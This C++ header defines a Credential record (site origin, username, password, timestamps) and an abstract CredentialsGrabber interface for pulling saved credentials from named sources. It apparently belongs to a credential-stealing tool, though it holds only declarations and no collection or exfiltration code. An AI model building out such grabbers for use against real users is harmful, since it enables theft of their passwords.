#pragma once
#include "Utils/Time.hpp"

#include <string>
#include <vector>

struct Credential final
{
	std::wstring origin;
	std::wstring username;
	std::wstring password;
	std::optional<Time::Datetime> created_time;
	std::optional<Time::Datetime> accessed_time;
	std::optional<Time::Datetime> modified_time;

	[[nodiscard]] std::wstring serialize() const;
};

using Credentials = std::vector<Credential>;

class CredentialsGrabber
{
public:
	using Ptr = std::unique_ptr<CredentialsGrabber>;

	explicit CredentialsGrabber() = default;
	virtual ~CredentialsGrabber() = default;
	CredentialsGrabber(const CredentialsGrabber&) = delete;
	CredentialsGrabber& operator=(const CredentialsGrabber&) = delete;
	CredentialsGrabber(CredentialsGrabber&&) = delete;
	CredentialsGrabber& operator=(CredentialsGrabber&&) = delete;

	[[nodiscard]] virtual std::optional<Credentials> grab_credentials() const = 0;
	[[nodiscard]] virtual std::wstring source() const = 0;
};
